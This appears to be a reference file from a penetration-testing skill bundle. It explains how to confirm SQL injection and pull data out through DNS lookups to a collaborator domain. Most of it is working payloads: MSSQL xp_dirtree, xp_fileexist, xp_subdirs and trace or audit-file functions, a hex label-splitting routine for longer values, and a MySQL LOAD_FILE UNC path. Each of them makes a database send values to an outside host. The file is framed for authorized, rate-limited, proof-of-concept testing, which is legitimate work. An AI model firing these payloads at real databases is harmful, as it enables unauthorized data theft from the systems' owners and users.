# Out-of-band DNS confirmation and exfiltration

The main skill's Gate 0 and the `triage-validation` chain both demand an
out-of-band callback with a unique marker as the confirmation that survives a
WAF and a flaky timing channel. This file is the payload side of that
requirement. It is read-only: every technique here is a `SELECT` or a read
function whose only effect is a DNS lookup, and none of it modifies data.

OOB DNS beats time-based blind for two reasons. It carries the stolen value in
the DNS label itself, so a single request can exfiltrate data rather than one
bit of boolean oracle, and a DNS hit at a collaborator you control is far harder
to mistake for latency noise than a sleep delta. It needs one precondition the
timing channel does not: the database host must be able to resolve an external
name, which is itself worth confirming.

**Cadence.** Serial, 1.5s base plus up to 1.5s jitter. Caps per parameter: 10
confirmation requests, and for a character-splitting exfiltration no more
requests than the data length divided by the per-request label budget, with a
hard cap of 50. This is not a loop to leave running.

---

## The confirmation ladder

1. Send a payload whose DNS label is a **fixed unique marker** (not data yet),
   sub-tagged per injection point, for example
   `sqli-<param>-<rand>.<your-collaborator-domain>`.
2. Poll the collaborator. A DNS hit carrying the exact marker, with the database
   host's source resolver IP, proves the injection reached a function that
   performs a lookup. That is the confirmation.
3. Only then replace the marker with a single short value you are entitled to
   read (a version string, your own test row). Stop at a proof-of-concept value;
   a full table dump over DNS is noisy and unnecessary to establish the finding.

Use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
or [interactsh](https://github.com/projectdiscovery/interactsh) as the logger.
Both give per-request subdomains and a DNS history you can attribute.

---

## MSSQL

SQL Server has the richest OOB surface because several functions take a file
path and will resolve a UNC path's hostname before touching the share. Point
that hostname at a collaborator subdomain and the resolution leaks the label.

The idiom declares a `VARCHAR`, assigns the value to exfiltrate into it, and
concatenates it as a subdomain so the result is guaranteed to be a string:

```sql
DECLARE @T VARCHAR(1024);
SELECT @T = (SELECT @@version);
EXEC('master..xp_dirtree "\\' + @T + '.<param>-<rand>.<collab>\x"');
```

| Function | Shape | Note |
|---|---|---|
| `master..xp_dirtree` | `EXEC('master..xp_dirtree "\\'+@T+'.<collab>\x"')` | Extended stored proc, undocumented but long-standing; the workhorse. |
| `master..xp_fileexist` | `EXEC('master..xp_fileexist "\\'+@T+'.<collab>\x"')` | Pentestmonkey notes that without sufficient privilege it returns "does not exist" without resolving the path, so a null result is not proof the injection failed. |
| `master..xp_subdirs` | `EXEC('master..xp_subdirs "\\'+@T+'.<collab>\x"')` | As `xp_dirtree`. |
| `sys.fn_trace_gettable` | `SELECT * FROM fn_trace_gettable('\\'+@T+'.<collab>\x.trc', DEFAULT)` | Documented system function; requires `ALTER TRACE` on the server. |
| `sys.fn_get_audit_file` | `SELECT * FROM fn_get_audit_file('\\'+@T+'.<collab>\', DEFAULT, DEFAULT)` | Reads an audit file path. |

### DNS label limits force splitting

A DNS label (the part between dots) is at most 63 characters and a whole name at
most 253, so a value longer than a label must be hex or base64 encoded and split
across labels. The documented pattern slices the encoded value and joins the
slices as adjacent labels:

```sql
DECLARE @T VARCHAR(MAX);
DECLARE @A VARCHAR(63);
DECLARE @B VARCHAR(63);
-- CONVERT(..., 1) yields a "0x..." hex string, so slicing starts at position 3.
SELECT @T = CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), <value>), 1);
SELECT @A = SUBSTRING(@T, 3, 63);
SELECT @B = SUBSTRING(@T, 3 + 63, 63);
EXEC('master..xp_subdirs "\\' + @A + '.' + @B + '.<param>-<rand>.<collab>\x"');
```

Ensure the inner query returns exactly one row. A multi-row result breaks the
assignment, so aggregate or `TOP 1` first.

### The NTLM stopping point

A UNC path resolves a hostname and then attempts an SMB connection on port 445 to
the resulting IP. Against a collaborator **DNS** domain the finding is the DNS
label arriving at your logger, and that is where this file stops. Pointing the
UNC path at a host that actually speaks SMB additionally causes the SQL Server
service account to authenticate to it, which is forced authentication and
credential capture. That is excluded from this bundle: use a DNS-only
collaborator, confirm via the DNS history, and describe the SMB consequence in
prose rather than capturing it.

---

## PostgreSQL

The OOB primitive on PostgreSQL is `dblink`, and it is documented in full in
`postgresql-escalation.md`, including its preconditions and the rule that it
reaches a second host and therefore needs a separate written authorization. Use
that file; do not duplicate the connection payload here.

---

## Oracle and MySQL

Oracle has a well-known OOB surface through the `UTL_HTTP`, `UTL_INADDR` and
`DBMS_LDAP` packages and XXE-style `XMLType` tricks, and `security-arsenal`
already carries the Oracle time-based and OOB payload tree. Reach for that
rather than a payload reproduced from memory here, and verify the exact package
and function name against Oracle's documentation before sending it, because a
wrong identifier is an inert payload.

MySQL can trigger an outbound lookup through a UNC path in `LOAD_FILE` on
Windows (`LOAD_FILE('\\\\<collab>\\x')`), which depends on the `FILE` privilege
and on `secure_file_priv` not blocking the path. Confirm both before relying on
it, and treat the UNC target with the same DNS-only discipline as the MSSQL
section above.

---

## Sources

- Microsoft:
  [`sys.fn_trace_gettable`](https://learn.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-trace-gettable-transact-sql)
  (confirms the function, its file-path argument and the `ALTER TRACE`
  requirement).
- [pentestmonkey, exfiltrating data from MS SQL Server via DNS](https://pentestmonkey.net/blog/mssql-dns)
  for the privilege caveat on `xp_fileexist`.
- [NetSPI, second-order SQL injection with stored procedures (DNS egress)](https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/)
  for the `xp_dirtree` DNS-egress case and the port-445-only constraint.
- Tooling: [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator),
  [interactsh](https://github.com/projectdiscovery/interactsh).
- The MSSQL function list and the label-splitting idiom were checked against the
  operator's own Notion-sourced OOB-DNS note (freely reusable, no HackTricks
  import). The function names, the 63/253 DNS limits and the `ALTER TRACE`
  privilege are facts stated exactly; all framing, the read-only discipline and
  the NTLM stopping point are written here.
